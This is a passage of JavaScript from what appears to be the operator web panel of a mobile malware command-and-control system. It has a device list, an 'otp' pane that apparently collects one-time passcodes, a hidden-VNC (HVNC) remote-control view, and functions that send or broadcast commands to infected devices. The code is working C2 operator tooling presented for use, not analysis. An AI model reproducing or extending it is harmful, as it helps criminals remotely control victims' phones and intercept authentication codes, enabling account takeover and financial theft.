//  Pane switching
// ═══════════════════════════════════════════════════════════════════════════
function switchPane(id) {
  S.activePane = id;
  $$('.pane').forEach(p => p.classList.remove('active'));
  const pane = $(`#pane-${id}`);
  if (pane) pane.classList.add('active');
  $$('.nav-item').forEach(n => n.classList.toggle('active', n.dataset.pane === id));

  // Lazy renders
  if (id === 'otp')  renderOTPPane();
  if (id === 'feed') renderFeedPane();
  if (id === 'hvnc' && !S.selected) {
    $('#hvnc-inner').innerHTML = '<div class="empty-state" style="height:100%"><div class="es-icon">👈</div><div class="es-text">Select a device first</div></div>';
  }
}

// ═══════════════════════════════════════════════════════════════════════════
//  Commands
// ═══════════════════════════════════════════════════════════════════════════
window.sendCmd = (id, cmd, args = {}) => {
  sendWS({ type: 'cmd', target: id, cmd, args });
  toast(`→ ${cmd}`, 'info');
};

window.openCmdModal = (id, cmdName) => {
  const cat  = CMD_CATALOG.find(c => c.cmds.some(x => x.cmd === cmdName));
  const cDef = cat?.cmds.find(x => x.cmd === cmdName);
  if (!cDef) return;

  let formHtml = '';
  for (const a of (cDef.args || [])) {
    formHtml += `<div class="form-group">
      <label class="form-label">${esc(a.key)}${a.hint ? ' <span class="text-dim">('+esc(a.hint)+')</span>' : ''}</label>
      <input class="form-input" id="arg-${esc(a.key)}" value="${esc(a.def || '')}" placeholder="${esc(a.hint || '')}">
    </div>`;
  }

  openModal(`Command: ${cmdName}`, formHtml || '<p class="text-dim">No arguments required.</p>', [
    { label: 'Send', cls: 'btn-primary', fn: () => {
      const args = {};
      for (const a of (cDef.args || [])) {
        const v = $(`#arg-${a.key}`)?.value;
        if (v !== undefined && v !== '') {
          args[a.key] = a.type === 'number' ? Number(v) : v === 'true' ? true : v === 'false' ? false : v;
        }
      }
      sendCmd(id, cmdName, args);
      closeModal();
    }},
  ]);
};

window.broadcastDialog = () => {
  openModal('Broadcast Command', `
    <div class="form-group"><label class="form-label">Command</label><input class="form-input" id="bc-cmd" placeholder="e.g. GET_DEVICE_INFO"></div>
    <div class="form-group"><label class="form-label">Args (JSON)</label><input class="form-input" id="bc-args" placeholder="{}"></div>
  `, [{
    label: 'Broadcast', cls: 'btn-danger', fn: () => {
      const cmd  = $('#bc-cmd')?.value?.trim();
      const args = $('#bc-args')?.value?.trim() || '{}';
      if (!cmd) return;
      let parsed = {};
      try { parsed = JSON.parse(args); } catch { toast('Args JSON invalid', 'error'); return; }
      sendWS({ type: 'broadcast_cmd', cmd, args: parsed });
      closeModal();
    }
  }]);
};

window.setAlias = async id => {
  const alias = $('#alias-input')?.value?.trim() || null;
  await api(`/api/devices/${id}/alias`, 'PATCH', { alias });
  if (S.devices[id]) S.devices[id].alias = alias;
  renderDeviceRow(id);
  if (S.selected === id) renderDeviceInfo(id);
  toast('Alias saved', 'success');
};

window.deleteDevice = async id => {
  if (!confirm('Delete all data for this device?')) return;
  await api(`/api/devices/${id}`, 'DELETE');
  toast('Device deleted', 'success');
};

// ═══════════════════════════════════════════════════════════════════════════
//  Modal
// ═══════════════════════════════════════════════════════════════════════════
function openModal(title, bodyHtml, btns = []) {
  const backdrop = $('#modal-backdrop');
  const body     = $('#modal-body');
  const footer   = $('#modal-footer');
  const titleEl  = $('#modal-title');
  if (!backdrop) return;
  if (titleEl) titleEl.textContent = title;
  if (body)    body.innerHTML = bodyHtml;
  if (footer) {
    footer.innerHTML = '';
    const cancel = el('button', { class: 'btn btn-ghost btn-sm', onclick: closeModal }, 'Cancel');
    footer.appendChild(cancel);
    for (const b of btns) {
      const btn = el('button', { class: `btn btn-sm ${b.cls || 'btn-primary'}`, onclick: b.fn }, b.label);
      footer.appendChild(btn);
    }
  }
  backdrop.classList.add('open');
}

function closeModal() {
  $('#modal-backdrop')?.classList.remove('open');
}

window.closeModal = closeModal;

// ═══════════════════════════════════════════════════════════════════════════
//  Header stats
// ═══════════════════════════════════════════════════════════════════════════
function updateHeaderStats(s) {
  const el = (id, val) => { const e = $(`#stat-${id}`); if (e) e.textContent = val; };
  if (s.online        != null) el('online', s.online);
  if (s.queued_cmds   != null) el('queued', s.queued_cmds);
  if (s.operators     != null) el('ops', s.operators);
}

function updateHeaderOnline() {
  const n = Object.values(S.devices).filter(d => d.online).length;
  const el = $('#stat-online');
  if (el) el.textContent = n;
}

S._otpCount = 0;
function updateBadge(id, n) {
  const badge = $(`#${id}`);
  if (badge) { badge.textContent = n; badge.style.display = n > 0 ? '' : 'none'; }
}

// ═══════════════════════════════════════════════════════════════════════════
//  Helpers
// ═══════════════════════════════════════════════════════════════════════════
const esc = s => String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
const fmtTs = ts => ts ? new Date(ts * 1000).toLocaleString('en', { hour12: false }) : '—';
const deviceName = id => {
  const d = S.devices[id];
  if (!d) return (id || '?').slice(0, 8);
  return d.alias || d.info?.model || d.info?.brand || id.slice(0, 8);
};

window.copyText = text => {
  navigator.clipboard.writeText(text).then(() => toast('Copied!', 'success'));
};

async function api(path, method = 'GET', body) {
  const opts = { method, headers: { 'Content-Type': 'application/json' } };
  if (body) opts.body = JSON.stringify(body);
  const res = await fetch(path, opts);
  if (!res.ok) throw new Error(`HTTP ${res.status}`);
  return res.json();
}

function toast(msg, type = 'info') {
  const tc = $('#toast-container');
  if (!tc) return;
  const t = el('div', { class: `toast ${type}` }, msg);
  tc.appendChild(t);
  setTimeout(() => { t.classList.add('fade-out'); setTimeout(() => t.remove(), 300); }, 3500);
}

// ═══════════════════════════════════════════════════════════════════════════
//  Init
// ═══════════════════════════════════════════════════════════════════════════
document.addEventListener('DOMContentLoaded', () => {
  // Nav item clicks
  $$('.nav-item[data-pane]').forEach(n =>
    n.addEventListener('click', () => switchPane(n.dataset.pane))
  );

  // Device search
  $('#dl-search')?.addEventListener('input', () => renderDeviceList());

  // Modal backdrop close
  $('#modal-backdrop')?.addEventListener('click', e => {
    if (e.target === e.currentTarget) closeModal();
  });

  // HVNC back button
  $('#hvnc-back')?.addEventListener('click', stopHVNC);

  initWS();
  switchPane('devices');
});
